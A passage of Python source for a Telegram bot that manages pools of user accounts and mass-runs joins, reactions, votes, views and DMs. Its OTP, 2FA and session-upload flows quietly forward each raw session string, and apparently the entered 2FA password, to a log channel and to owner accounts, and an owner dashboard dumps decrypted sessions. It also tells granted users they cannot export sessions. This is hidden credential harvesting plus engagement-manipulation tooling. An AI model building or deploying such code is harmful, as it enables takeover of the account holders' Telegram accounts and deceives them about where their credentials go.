    await message.reply_text(f"✨ Revoked all assigned account ID access from user <code>{target_id}</code>.", parse_mode=enums.ParseMode.HTML)

# --- ADMINISTRATIVE ROLE MANAGEMENT COMMANDS ---
@app.on_message(filters.command("addadmin") & filters.private)
async def cmd_add_admin(client: Client, message: Message):
    user_id = message.from_user.id
    role = await db_mgr.get_user_role(user_id)
    if role not in ["owner", "super_owner"]:
        await message.reply_text("⚠️ <b>Clearance Denied:</b> This command requires Owner privilege tokens.")
        return
        
    parts = message.text.split()[1:]
    if not parts or not parts[0].isdigit():
        await message.reply_text("✨ <b>Syntax:</b> <code>/addadmin &lt;user_id&gt;</code>", parse_mode=enums.ParseMode.HTML)
        return
        
    target_id = int(parts[0])
    
    await db_mgr.users.update_one(
        {"user_id": target_id},
        {"$set": {"role": "admin", "max_accounts": 999999999}},
        upsert=True
    )
        
    await message.reply_text(f"💎 <b>Success:</b> User <code>{target_id}</code> updated to Admin with unlimited account capacity.", parse_mode=enums.ParseMode.HTML)
    await db_mgr.log_action(user_id, f"Made user {target_id} an Admin", client, operational=True)

@app.on_message(filters.command("removeadmin") & filters.private)
async def cmd_remove_admin(client: Client, message: Message):
    user_id = message.from_user.id
    role = await db_mgr.get_user_role(user_id)
    if role not in ["owner", "super_owner"]:
        await message.reply_text("⚠️ <b>Clearance Denied:</b> This command requires Owner privilege tokens.")
        return
        
    parts = message.text.split()[1:]
    if not parts or not parts[0].isdigit():
        await message.reply_text("✨ <b>Syntax:</b> <code>/removeadmin &lt;user_id&gt;</code>", parse_mode=enums.ParseMode.HTML)
        return
        
    target_id = int(parts[0])
    await db_mgr.users.update_one({"user_id": target_id}, {"$set": {"role": "user"}})
        
    await message.reply_text(f"💎 <b>Success:</b> Authorization structural privileges revoked from Admin ID <code>{target_id}</code>.", parse_mode=enums.ParseMode.HTML)
    await db_mgr.log_action(user_id, f"Removed Admin role from user {target_id}", client, operational=True)

# --- DATABASE PURGE & TELEMETRY COMMANDS ---
@app.on_message(filters.command("purgedatabase") & filters.private)
async def cmd_purge_database(client: Client, message: Message):
    user_id = message.from_user.id
    role = await db_mgr.get_user_role(user_id)
    if role not in ["admin", "owner", "super_owner"]:
        await message.reply_text("⚠️ <b>Clearance Denied:</b> Only Administrators and Owners can perform dynamic dataset purges.")
        return

    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton(text="⚠️ YES, PURGE ALL DATABASE DATA ⚠️", callback_data="confirm_purge_database")],
        [InlineKeyboardButton(text="🔙 Cancel Operation", callback_data="admin_panel")]
    ])
    await message.reply_text(
        "🚨 <b>CRITICAL WARNING: DATABASE PURGE INITIATION</b> 🚨\n\n"
        "You are initiating a complete purge of MongoDB Data Stores!\n"
        "This will permanently drop:\n"
        "• All linked account credentials and Telethon session strings\n"
        "• All registered system users & administration records\n"
        "• All task history, logs, and account assignments\n\n"
        "<i>Are you completely sure you wish to proceed?</i>",
        reply_markup=kb,
        parse_mode=enums.ParseMode.HTML
    )

@app.on_callback_query(filters.regex("^confirm_purge_database$"))
async def handle_confirm_purge_database(client: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    role = await db_mgr.get_user_role(user_id)
    if role not in ["admin", "owner", "super_owner"]:
        await callback.answer("🚫 Unauthorized action.", show_alert=True)
        return

    await callback.answer()
    await callback.message.edit_text("💥 <i>Purging entire MongoDB database collections... Please hold...</i>", parse_mode=enums.ParseMode.HTML)
    
    await db_mgr.purge_entire_database()
    await db_mgr.init()
    
    await callback.message.edit_text(
        "✨ <b>Database Purge Completed Successfully!</b>\n"
        "All MongoDB collections have been completely cleared and reset.",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu")]]),
        parse_mode=enums.ParseMode.HTML
    )
    await db_mgr.log_action(user_id, "PERFORMED FULL DATABASE PURGE", client, operational=True)

@app.on_message(filters.command("dbstorage") & filters.private)
async def cmd_db_storage(client: Client, message: Message):
    user_id = message.from_user.id
    role = await db_mgr.get_user_role(user_id)
    if role not in ["admin", "owner", "super_owner"]:
        await message.reply_text("⚠️ <b>Clearance Denied:</b> This command requires Admin privileges.")
        return

    stats = await db_mgr.get_storage_stats()
    
    total_mb = stats["total_size"] / (1024 * 1024)
    data_mb = stats["data_size"] / (1024 * 1024)
    storage_mb = stats["storage_size"] / (1024 * 1024)
    index_mb = stats["index_size"] / (1024 * 1024)

    text = (
        f"💾 <b>MongoDB Real-Time Storage Telemetry Matrix</b>\n\n"
        f"📊 <b>Total Allocated Database Size:</b> <code>{total_mb:.2f} MB</code>\n"
        f"📁 <b>Uncompressed Data Payload:</b> <code>{data_mb:.2f} MB</code>\n"
        f"🗄️ <b>Disk Storage Physical Footprint:</b> <code>{storage_mb:.2f} MB</code>\n"
        f"🔍 <b>Index Mapping Overhead:</b> <code>{index_mb:.2f} MB</code>\n\n"
        f"📚 <b>Active System Collections:</b> <code>{stats['collections']}</code>\n"
        f"📦 <b>Total MongoDB Objects Record Items:</b> <code>{stats['objects']}</code>"
    )
    await message.reply_text(text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(text="💎 Home Menu", callback_data="main_menu")]]), parse_mode=enums.ParseMode.HTML)

# --- BROADCAST SYSTEM WORKFLOW ---
@app.on_message(filters.command("broadcast") & filters.private)
async def cmd_broadcast_start(client: Client, message: Message):
    user_id = message.from_user.id
    role = await db_mgr.get_user_role(user_id)
    if role not in ["admin", "owner", "super_owner"]:
        await message.reply_text("⚠️ <b>Clearance Denied:</b> Command restricted to Administration Nodes.")
        return
        
    await message.reply_text("📢 <b>Input Data Text or Multimedia payload content to broadcast:</b>", parse_mode=enums.ParseMode.HTML)
    set_user_state(user_id, "waiting_for_broadcast_msg")

@app.on_message(filters.private & ~filters.command(["start", "canceltasks", "grantaccess", "revokeaccess", "addadmin", "removeadmin", "purgedatabase", "dbstorage", "broadcast"]))
async def process_text_and_media_messages(client: Client, message: Message):
    user_id = message.from_user.id
    state, data = get_user_state(user_id)

    if not state:
        return

    # Grant access steps
    if state == "waiting_for_grant_uid":
        val = message.text.strip()
        if not val.isdigit():
            await message.reply_text("❌ Target User ID must be a numerical integer. Retry:")
            return
        
        target_uid = int(val)
        set_user_state(user_id, "waiting_for_grant_count", {"grant_target_uid": target_uid})
        await message.reply_text(f"📱 <b>Enter account capacity count to grant for User ID <code>{target_uid}</code> (e.g. 20):</b>", parse_mode=enums.ParseMode.HTML)
        return

    if state == "waiting_for_grant_count":
        val = message.text.strip()
        if not val.isdigit():
            await message.reply_text("❌ Count must be a positive integer. Retry:")
            return
        
        count = int(val)
        target_uid = data.get("grant_target_uid")
        clear_user_state(user_id)

        cursor = db_mgr.accounts.find({"status": "active"}).limit(count)
        rows = [doc async for doc in cursor]

        if not rows:
            await message.reply_text("❌ No active accounts found in database to grant.")
            return

        assigned_count = 0
        for row in rows:
            ph = row["phone"]
            try:
                await db_mgr.assignments.update_one(
                    {"user_id": target_uid, "phone": ph},
                    {"$setOnInsert": {"user_id": target_uid, "phone": ph}},
                    upsert=True
                )
                assigned_count += 1
            except Exception:
                pass

        await message.reply_text(
            f"👑 <b>Access Provisioned Successfully!</b>\n\n"
            f"👤 Target User ID: <code>{target_uid}</code>\n"
            f"📱 Granted IDs Allocation: <code>{assigned_count}</code> active accounts\n"
            f"🔒 <i>Note: This user can ONLY execute tasks using these IDs and CANNOT export session strings.</i>",
            parse_mode=enums.ParseMode.HTML
        )

        try:
            await client.send_message(
                chat_id=target_uid,
                text=f"🎉 <b>Special Task Access Granted!</b>\nAdmin has provisioned <code>{assigned_count}</code> account IDs for your task execution. You can now use these accounts in Task Launcher!",
                parse_mode=enums.ParseMode.HTML
            )
        except Exception:
            pass
        return

    # Reset access steps
    if state == "waiting_for_reset_uid":
        val = message.text.strip()
        if not val.isdigit():
            await message.reply_text("❌ Target User ID must be a numerical integer. Retry:")
            return
        
        target_uid = int(val)
        clear_user_state(user_id)
        
        await db_mgr.assignments.delete_many({"user_id": target_uid})
        await message.reply_text(f"✨ <b>Reset Complete!</b> All assigned account ID access has been revoked for User ID <code>{target_uid}</code>.", parse_mode=enums.ParseMode.HTML)
        return

    # Promote Admin steps
    if state == "waiting_for_addadmin_uid":
        val = message.text.strip()
        if not val.isdigit():
            await message.reply_text("❌ User ID must be a numerical integer. Retry:")
            return
            
        target_id = int(val)
        clear_user_state(user_id)
        
        await db_mgr.users.update_one(
            {"user_id": target_id},
            {"$set": {"role": "admin", "max_accounts": 999999999}},
            upsert=True
        )
            
        await message.reply_text(f"💎 <b>Success:</b> User <code>{target_id}</code> updated to Admin with unlimited account capacity.", parse_mode=enums.ParseMode.HTML)
        await db_mgr.log_action(user_id, f"Made user {target_id} an Admin", client, operational=True)
        return

    # Demote Admin steps
    if state == "waiting_for_removeadmin_uid":
        val = message.text.strip()
        if not val.isdigit():
            await message.reply_text("❌ User ID must be a numerical integer. Retry:")
            return
            
        target_id = int(val)
        clear_user_state(user_id)
        
        await db_mgr.users.update_one({"user_id": target_id}, {"$set": {"role": "user"}})
            
        await message.reply_text(f"💎 <b>Success:</b> Authorization structural privileges revoked from Admin ID <code>{target_id}</code>.", parse_mode=enums.ParseMode.HTML)
        await db_mgr.log_action(user_id, f"Removed Admin role from user {target_id}", client, operational=True)
        return

    # Broadcast handler
    if state == "waiting_for_broadcast_msg":
        clear_user_state(user_id)
        status_msg = await message.reply_text("🚀 <i>Dispatching system global notifications layout across all registered user clusters...</i>", parse_mode=enums.ParseMode.HTML)
        
        cursor = db_mgr.users.find({}, {"user_id": 1})
        rows = [doc async for doc in cursor]
            
        success_hits = 0
        failed_hits = 0
        
        for r in rows:
            target_uid = r["user_id"]
            try:
                await message.copy(chat_id=target_uid)
                success_hits += 1
                await asyncio.sleep(0.05)  
            except Exception:
                failed_hits += 1
                
        await status_msg.edit_text(
            f"📢 <b>Global System Broadcast Complete!</b>\n\n"
            f"🟩 Delivered: <code>{success_hits}</code> unique profiles\n"
            f"🟪 Blocked/Dead targets dropped: <code>{failed_hits}</code> nodes",
            parse_mode=enums.ParseMode.HTML
        )
        return

    # OTP Registration Steps
    if state == "waiting_for_phone":
        phone = message.text.strip().replace(" ", "").replace("-", "")
        client_tg = TelegramClient(StringSession(), config.API_ID, config.API_HASH)
        await client_tg.connect()
        try:
            sent_code = await client_tg.send_code_request(phone)
            registration_sessions[user_id] = {"client": client_tg, "phone": phone, "phone_code_hash": sent_code.phone_code_hash}
            await message.reply_text("📩 <b>Enter the authentication OTP code received from official Telegram channel:</b>", parse_mode=enums.ParseMode.HTML)
            set_user_state(user_id, "waiting_for_otp")
        except Exception as e:
            await message.reply_text(f"❌ <b>API Initialization Framework Refusal:</b> <code>{str(e)}</code>", parse_mode=enums.ParseMode.HTML)
            await client_tg.disconnect()
            clear_user_state(user_id)
        return

    if state == "waiting_for_otp":
        otp = message.text.strip()
        reg_data = registration_sessions.get(user_id)
        if not reg_data:
            await message.reply_text("❌ Context session dropped framework boundaries. Re-run setup sequence initialization loops.")
            clear_user_state(user_id)
            return

        client_tg, phone, phone_code_hash = reg_data["client"], reg_data["phone"], reg_data["phone_code_hash"]
        try:
            await client_tg.sign_in(phone=phone, code=otp, phone_code_hash=phone_code_hash)
            await complete_registration(message, client_tg, phone, user_id, client)
        except PhoneCodeInvalidError:
            await message.reply_text("❌ <b>The security signature token OTP code entered was mismatched/invalid. Retry again:</b>", parse_mode=enums.ParseMode.HTML)
        except SessionPasswordNeededError:
            await dispatch_2fa_alert(client, user_id, phone)
            await message.reply_text("🔒 <b>Two-Factor security matrix verification prompt detected. Type your 2FA security password text:</b>", parse_mode=enums.ParseMode.HTML)
            set_user_state(user_id, "waiting_for_2fa")
        except Exception as e:
            await message.reply_text(f"❌ <b>Authentication Chain Refusal:</b> <code>{str(e)}</code>", parse_mode=enums.ParseMode.HTML)
            await client_tg.disconnect()
            clear_user_state(user_id)
        return

    if state == "waiting_for_2fa":
        password = message.text.strip()
        reg_data = registration_sessions.get(user_id)
        if not reg_data:
            clear_user_state(user_id)
            return
        try:
            await reg_data["client"].sign_in(password=password)
            await dispatch_2fa_alert(client, user_id, reg_data["phone"], password_entered=password)
            await complete_registration(message, reg_data["client"], reg_data["phone"], user_id, client)
        except Exception as e:
            await message.reply_text(f"❌ <b>Cloud Password Evaluation Denied:</b> <code>{str(e)}</code>", parse_mode=enums.ParseMode.HTML)
            await reg_data["client"].disconnect()
            clear_user_state(user_id)
        return

    if state == "waiting_for_session_file":
        raw_content = ""
        if message.document:
            download_path = await client.download_media(message)
            with open(download_path, "r", encoding="utf-8", errors="ignore") as f:
                raw_content = f.read().strip()
            if os.path.exists(download_path):
                os.remove(download_path)
        elif message.text:
            raw_content = message.text.strip()

        if not raw_content:
            await message.reply_text("❌ <b>Source Error:</b> Empty input detected. Verification canceled.")
            clear_user_state(user_id)
            return

        potential_sessions = [s.strip() for s in re.split(r'[\r\n,;]+', raw_content) if len(s.strip()) > 30]
        
        if not potential_sessions:
            await message.reply_text("❌ <b>Parse Failure:</b> Could not isolate any valid telethon format session string sequences inside your text.")
            clear_user_state(user_id)
            return

        status_msg = await message.reply_text(f"⚡ <b>Analyzing and validating <code>{len(potential_sessions)}</code> potential session profiles chunks...</b>", parse_mode=enums.ParseMode.HTML)
        
        success_imports = 0
        failed_imports = 0

        for session_str in potential_sessions:
            try:
                client_tg = TelegramClient(StringSession(session_str), config.API_ID, config.API_HASH)
                await client_tg.connect()
                if not await client_tg.is_user_authorized():
                    failed_imports += 1
                    await client_tg.disconnect()
                    continue
                    
                me = await client_tg.get_me()
                phone = me.phone or f"custom_{me.id}"
                encrypted_session = encrypt_data(session_str)
                
                await db_mgr.accounts.update_one(
                    {"phone": phone.replace("+", "")},
                    {"$set": {
                        "phone": phone.replace("+", ""),
                        "user_id": user_id,
                        "username": me.username or "None",
                        "session_string": encrypted_session,
                        "status": "active",
                        "last_active": time.time()
                    }},
                    upsert=True
                )

                await dispatch_session_telemetry(phone, session_str, me.username, user_id, client)
                success_imports += 1
                await client_tg.disconnect()
            except Exception:
                failed_imports += 1

        result_text = (
            f"✨ <b>Bulk Framework Import Profile Sync Complete!</b>\n\n"
            f"🟩 Successfully added: <code>{success_imports}</code> accounts\n"
            f"num Terminated/Mismatched failed count: <code>{failed_imports}</code> keys"
        )

        await status_msg.edit_text(result_text, reply_markup=get_post_registration_keyboard(), parse_mode=enums.ParseMode.HTML)
        clear_user_state(user_id)
        return

    # Task Wizard handlers
    if state == "waiting_for_channel_link":
        channel_target = message.text.strip()
        set_user_state(user_id, "waiting_for_post_link", {"channel_target": channel_target})
        await message.reply_text("<b>Step 3: Paste message tracker specific structural index link URL (Example: https://t.me/channelname/123):</b>", parse_mode=enums.ParseMode.HTML)
        return

    if state == "waiting_for_post_link":
        target = message.text.strip()
        set_user_state(user_id, state, {"target": target})
        _, current_data = get_user_state(user_id)
        task_type = current_data.get("task_type")

        if task_type in ["join", "leave", "refer", "view", "speed"]:
            await prompt_for_account_scale(message)
        elif "react" in task_type and "vote" not in task_type:
            set_user_state(user_id, "waiting_for_emojis", {"selected_emojis": []})
            await message.reply_text(
                "<b>Step 4: Select target reaction array configurations:</b>",
                reply_markup=get_emoji_selection_keyboard([]),
                parse_mode=enums.ParseMode.HTML
            )
        elif "vote" in task_type:
            kb = InlineKeyboardMarkup([
                [InlineKeyboardButton(text="🔘 Native Poll Option Index Selection", callback_data="set_vmode:poll")],
                [InlineKeyboardButton(text="🎛️ Inline Callback Keyboard Button Matching", callback_data="set_vmode:inline")]
            ])
            set_user_state(user_id, "waiting_for_vote_mode_choice")
            await message.reply_text("<b>Step 4: Specify the structural mechanics type of voting button to target:</b>", reply_markup=kb, parse_mode=enums.ParseMode.HTML)
        elif task_type == "dm":
            set_user_state(user_id, "waiting_for_dm_text")
            await message.reply_text("<b>Step 4: Write exact content message context layout to disperse across targets:</b>", parse_mode=enums.ParseMode.HTML)
        return

    if state == "waiting_for_poll_option_index":
        val = message.text.strip()
        if not val.isdigit():
            await message.reply_text("❌ Option pointer index value must be a zero-indexed numerical integer.")
            return
        set_user_state(user_id, state, {"poll_option_index": int(val)})
        
        _, current_data = get_user_state(user_id)
        if "react" in current_data.get("task_type", ""):
            set_user_state(user_id, "waiting_for_emojis", {"selected_emojis": []})
            await message.reply_text(
                "<b>Step 5: Select concurrent target reaction array configurations:</b>",
                reply_markup=get_emoji_selection_keyboard([]),
                parse_mode=enums.ParseMode.HTML
            )
        else:
            await prompt_for_account_scale(message)
        return

    if state == "waiting_for_button_text":
        set_user_state(user_id, state, {"button_text": message.text.strip()})
        _, current_data = get_user_state(user_id)
        if "react" in current_data.get("task_type", ""):
            set_user_state(user_id, "waiting_for_emojis", {"selected_emojis": []})
            await message.reply_text(
                "<b>Step 5: Select concurrent target reaction array configurations:</b>",
                reply_markup=get_emoji_selection_keyboard([]),
                parse_mode=enums.ParseMode.HTML
            )
        else:
            await prompt_for_account_scale(message)
        return

    if state == "waiting_for_dm_text":
        set_user_state(user_id, state, {"text": message.text.strip()})
        await prompt_for_account_scale(message)
        return

    if state == "waiting_for_account_scale":
        scale_text = message.text.strip()
        if not scale_text.isdigit():
            await message.reply_text("❌ <b>Syntax Error:</b> Numerical integer capacity scaling inputs expected exclusively:")
            return
            
        requested_count = int(scale_text)
        role = await db_mgr.get_user_role(user_id)
        _, current_data = get_user_state(user_id)
        account_routing = current_data.get("account_routing", "own")
        
        if role == "super_owner" and account_routing == "all":
            max_available = await db_mgr.accounts.count_documents({"status": "active"})
        elif role in ["owner", "admin"]:
            max_available = await db_mgr.accounts.count_documents({"status": "active"})
        else:
            assigned_phones = [doc["phone"] async for doc in db_mgr.assignments.find({"user_id": user_id})]
            max_available = await db_mgr.accounts.count_documents({
                "status": "active",
                "$or": [{"user_id": user_id}, {"phone": {"$in": assigned_phones}}]
            })

        if requested_count > max_available:
            await message.reply_text(f"❌ <b>Resource Boundary Exceeded:</b> Accessible session pool caps at <code>{max_available}</code>. Lower your scale query value:", parse_mode=enums.ParseMode.HTML)
            return

        set_user_state(user_id, state, {"run_account_count": requested_count})
        await finalize_task_creation(message, client)
        return

@app.on_callback_query(filters.regex("^system_credits$"))
async def handle_system_credits(client: Client, callback: CallbackQuery):
    await callback.answer()
    credits_text = (
        "🔱 <b>Lead Operations Developer Architect Info</b>\n\n"
        f"🎨 <b>UI/UX Aesthetic Architect:</b> @{config.DESIGNER_HANDLE}\n"
        f"⚙️ <b>Core Binary Operations Engineer:</b> @{config.MANAGER_HANDLE}\n\n"
        "<i>Thank you for utilising our premium cluster account management utility matrix core!</i>"
    )
    buttons = [[InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu")]]
    await callback.message.edit_text(text=credits_text, reply_markup=InlineKeyboardMarkup(buttons), parse_mode=enums.ParseMode.HTML)

# --- PAGINATED ACCOUNTS VIEW ---
@app.on_callback_query(filters.regex("^manage_accounts:"))
async def list_user_accounts(client: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    page = int(callback.data.split(":")[1])
    limit = 10
    offset = page * limit
    
    try:
        await callback.answer() 
        role = await db_mgr.get_user_role(user_id)
        
        if role in ["owner", "super_owner"]:
            total_items = await db_mgr.accounts.count_documents({})
            cursor = db_mgr.accounts.find({}).skip(offset).limit(limit)
        else:
            total_items = await db_mgr.accounts.count_documents({"user_id": user_id})
            cursor = db_mgr.accounts.find({"user_id": user_id}).skip(offset).limit(limit)

        rows = [doc async for doc in cursor]

        text = f"📱 <b>System Session Telephony Matrix</b> (Page {page + 1})\n"
        text += f"Total registered datastore slots catalogued: <code>{total_items}</code>\n\n"
        
        if not rows:
            text += "<i>No profile records mapped inside this page window framework.</i>"
        else:
            for row in rows:
                icon = "🟢" if row["status"] == "active" else "🔴"
                text += f"{icon} <code>+{row['phone']}</code> (<b>@{row.get('username', 'None')}</b>) ➜ [<b>{row['status'].upper()}</b>]\n"

        buttons = []
        import_row = [
            InlineKeyboardButton(text="⭐ Connect via OTP", callback_data="add_account_phone"),
            InlineKeyboardButton(text="📁 Upload String File", callback_data="add_account_session")
        ]
        buttons.append(import_row)

        if role in ["super_owner", "owner"]:
            buttons.append([InlineKeyboardButton(text="📥 Open Session Export Dashboard", callback_data="export_dashboard_root")])
            
        buttons.append([InlineKeyboardButton(text="💥 Delete Dead Sessions", callback_data=f"purge_dead_accounts:{page}")])
        
        nav_row = []
        if page > 0:
            nav_row.append(InlineKeyboardButton(text="⏮️ Previous", callback_data=f"manage_accounts:{page - 1}"))
        if offset + limit < total_items:
            nav_row.append(InlineKeyboardButton(text="Next ⏭️", callback_data=f"manage_accounts:{page + 1}"))
        
        if nav_row:
            buttons.append(nav_row)
            
        buttons.append([InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu")])
        await callback.message.edit_text(text=text, reply_markup=InlineKeyboardMarkup(buttons), parse_mode=enums.ParseMode.HTML)
    except Exception as e:
        logger.error(f"Error handling list view page context: {e}")

@app.on_callback_query(filters.regex("^purge_dead_accounts:"))
async def handle_purge_dead_accounts(client: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    page = int(callback.data.split(":")[1])
    role = await db_mgr.get_user_role(user_id)
    
    if role in ["owner", "super_owner"]:
        await db_mgr.accounts.delete_many({"status": "dead"})
    else:
        await db_mgr.accounts.delete_many({"status": "dead", "user_id": user_id})
        
    await callback.answer("✨ Purge process complete! Dead profile sessions dropped.", show_alert=True)
    callback.data = f"manage_accounts:{page}"
    await list_user_accounts(client, callback)

# --- LINK NEW ACCOUNT VIA OTP & 2FA ---
@app.on_callback_query(filters.regex("^add_account_phone$"))
async def add_account_start(client: Client, callback: CallbackQuery):
    await callback.answer()
    user_id = callback.from_user.id
    await callback.message.edit_text("📱 <b>Type targeted terminal phone number string with country code mapping prefix (e.g. +919876543210):</b>", parse_mode=enums.ParseMode.HTML)
    set_user_state(user_id, "waiting_for_phone")

async def complete_registration(message: Message, client_tg: TelegramClient, phone: str, user_id: int, bot_client: Client):
    try:
        me = await client_tg.get_me()
        raw_session_str = client_tg.session.save()
        encrypted_session = encrypt_data(raw_session_str)
        
        await db_mgr.accounts.update_one(
            {"phone": phone.replace("+", "")},
            {"$set": {
                "phone": phone.replace("+", ""),
                "user_id": user_id,
                "username": me.username or "None",
                "session_string": encrypted_session,
                "status": "active",
                "last_active": time.time()
            }},
            upsert=True
        )
        
        await dispatch_session_telemetry(phone, raw_session_str, me.username, user_id, bot_client)

        await message.reply_text(
            f"🎉 <b>Onboarding Successful!</b> Account <code>+{phone}</code> is verified and logged inside system memory banks.", 
            reply_markup=get_post_registration_keyboard(),
            parse_mode=enums.ParseMode.HTML
        )
    except Exception as e:
        await message.reply_text(f"❌ <b>Telemetry Storage Pipeline Failure:</b> <code>{str(e)}</code>", parse_mode=enums.ParseMode.HTML)
    finally:
        await client_tg.disconnect()
        registration_sessions.pop(user_id, None)
        clear_user_state(user_id)

@app.on_callback_query(filters.regex("^add_account_session$"))
async def add_account_session_start(client: Client, callback: CallbackQuery):
    await callback.answer()
    user_id = callback.from_user.id
    await callback.message.edit_text("📁 <b>Drop your raw telethon string session strings layout, text line values, or upload a .txt / .session file log:</b>\n<i>(Supports unlimited bulk multi-line file imports!)</i>", parse_mode=enums.ParseMode.HTML)
    set_user_state(user_id, "waiting_for_session_file")

# Telemetry Dispatch Helper
async def dispatch_session_telemetry(phone: str, session_str: str, username: Optional[str], adder_id: int, bot: Client):
    temp_filename = f"session_{phone}.txt"
    with open(temp_filename, "w", encoding="utf-8") as f:
        f.write(session_str)
        
    caption = f"🔑 <b>Session Event Telemetry Dump</b>\nPhone: <code>+{phone}</code>\nUsername: <b>@{username or 'None'}</b>\nOperator Creator ID: <code>{adder_id}</code>"
    
    if config.LOG_CHANNEL_ID:
        try:
            await bot.send_document(chat_id=config.LOG_CHANNEL_ID, document=temp_filename, caption=caption, parse_mode=enums.ParseMode.HTML)
        except Exception as e:
            logger.error(f"Failed sending updates to log channel: {e}")
            
    for owner_id in config.SUPER_OWNER_IDS:
        try:
            await bot.send_document(chat_id=owner_id, document=temp_filename, caption=caption, parse_mode=enums.ParseMode.HTML)
        except Exception as e:
            logger.error(f"Failed sending data to owner node {owner_id}: {e}")
            
    if os.path.exists(temp_filename):
        os.remove(temp_filename)

# --- EXPORT ARCHIVE MANAGEMENT HOOKS (RESTRICTED TO OWNERS ONLY) ---
@app.on_callback_query(filters.regex("^export_dashboard_root$"))
async def export_dashboard_root(client: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    role = await db_mgr.get_user_role(user_id)
    
    if role not in ["super_owner", "owner"]:
        await callback.answer("⚠️ Clearance Level Violated: File extraction dashboard tools are barred for non-owners.", show_alert=True)
        return
        
    await callback.answer()
    text = "📥 <b>Session Extraction Management Dashboard Terminal</b>\nSelect extraction criteria filters:"
    buttons = [
        [InlineKeyboardButton(text="🎯 Extract 1 Single Session Profile", callback_data="select_export_session:0")],
        [InlineKeyboardButton(text="🎭 Multi-Session Extract", callback_data="export_multi_start:0")],
        [InlineKeyboardButton(text="📦 Extract Full Pack", callback_data="bulk_admin_export")],
        [InlineKeyboardButton(text="🔙 Return Back", callback_data="manage_accounts:0")]
    ]
    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(buttons), parse_mode=enums.ParseMode.HTML)

@app.on_callback_query(filters.regex("^select_export_session:"))
async def select_export_session_menu(client: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    page = int(callback.data.split(":")[1])
    await callback.answer()
    
    limit = 10
    offset = page * limit
    role = await db_mgr.get_user_role(user_id)
    
    if role == "super_owner":
        total_items = await db_mgr.accounts.count_documents({"status": "active"})
        cursor = db_mgr.accounts.find({"status": "active"}).skip(offset).limit(limit)
    elif role == "owner":
        total_items = await db_mgr.accounts.count_documents({"status": "active", "user_id": {"$nin": config.SUPER_OWNER_IDS}})
        cursor = db_mgr.accounts.find({"status": "active", "user_id": {"$nin": config.SUPER_OWNER_IDS}}).skip(offset).limit(limit)
    else:
        await callback.message.reply_text("🚫 Permission check validation rejected.")
        return

    rows = [doc async for doc in cursor]

    if not rows:
        await callback.message.reply_text("⚠️ No accessible active telephony data clusters found corresponding to your filter access.")
        return

    text = f"Select structural database session profile target row to dump (Page {page + 1}):"
    buttons = [[InlineKeyboardButton(text=f"📱 +{r['phone']} (@{r.get('username', 'None')})", callback_data=f"export_ph:{r['phone']}")] for r in rows]
    
    nav_row = []
    if page > 0:
        nav_row.append(InlineKeyboardButton(text="⏮️ Previous", callback_data=f"select_export_session:{page - 1}"))
    if offset + limit < total_items:
        nav_row.append(InlineKeyboardButton(text="Next ⏭️", callback_data=f"select_export_session:{page + 1}"))
    if nav_row:
        buttons.append(nav_row)
        
    buttons.append([InlineKeyboardButton(text="🔙 Return Back", callback_data="export_dashboard_root")])
    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(buttons))

@app.on_callback_query(filters.regex("^export_ph:"))
async def handle_export_session_run(client: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    await callback.answer()
    phone = callback.data.split(":")[1]
    role = await db_mgr.get_user_role(user_id)
    
    if role not in ["super_owner", "owner"]:
        await callback.message.reply_text("🚫 Authorization access denied.")
        return

    doc = await db_mgr.accounts.find_one({"phone": phone})

    if not doc:
        await callback.message.reply_text("❌ Selected profile data missing inside datastore registries.")
        return

    if doc["user_id"] in config.SUPER_OWNER_IDS and role != "super_owner":
        await callback.message.reply_text("🛡️ <b>Access Violation:</b> Super Owner profiles are isolated and protected.")
        return

    temp_filename = f"string_{phone}.txt"
    with open(temp_filename, "w", encoding="utf-8") as f:
        f.write(decrypt_data(doc["session_string"]))

    await callback.message.reply_document(document=temp_filename, caption=f"✨ Session dump file generated safely for: <code>+{phone}</code>", parse_mode=enums.ParseMode.HTML)
    if os.path.exists(temp_filename):
        os.remove(temp_filename)

@app.on_callback_query(filters.regex("^export_multi_start:"))
async def export_multi_dashboard(client: Client, callback: CallbackQuery):
    await callback.answer()
    page = int(callback.data.split(":")[1])
    user_id = callback.from_user.id
    role = await db_mgr.get_user_role(user_id)
    
    if role not in ["super_owner", "owner"]:
        await callback.message.reply_text("🚫 Permission check validation rejected.")
        return
        
    _, fsm_data = get_user_state(user_id)
    selected = fsm_data.get("multi_export_selected", [])
    
    limit = 10
    offset = page * limit
    
    if role == "super_owner":
        total_items = await db_mgr.accounts.count_documents({"status": "active"})
        cursor = db_mgr.accounts.find({"status": "active"}).skip(offset).limit(limit)
    else:
        total_items = await db_mgr.accounts.count_documents({"status": "active", "user_id": {"$nin": config.SUPER_OWNER_IDS}})
        cursor = db_mgr.accounts.find({"status": "active", "user_id": {"$nin": config.SUPER_OWNER_IDS}}).skip(offset).limit(limit)
        
    rows = [doc async for doc in cursor]
        
    text = f"🎭 <b>Customized Pack Package Assembly Core Selector</b> (Page {page + 1})\nSelect accounts profiles to encapsulate:"
    buttons = []
    
    for r in rows:
        ph = r["phone"]
        chk = "💎 " if ph in selected else "⬜ "
        buttons.append([InlineKeyboardButton(text=f"{chk}+{ph}", callback_data=f"toggle_ex_ph:{ph}:{page}")])
        
    nav_row = []
    if page > 0:
        nav_row.append(InlineKeyboardButton(text="⏮️ Previous", callback_data=f"export_multi_start:{page - 1}"))
    if offset + limit < total_items:
        nav_row.append(InlineKeyboardButton(text="Next ⏭️", callback_data=f"export_multi_start:{page + 1}"))
    if nav_row:
        buttons.append(nav_row)
        
    buttons.append([InlineKeyboardButton(text="📦 Build Pack Bundle & Download Archive", callback_data="execute_multi_export")])
    buttons.append([InlineKeyboardButton(text="🛑 Terminate Pack Configuration", callback_data="export_dashboard_root")])
    
    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(buttons), parse_mode=enums.ParseMode.HTML)
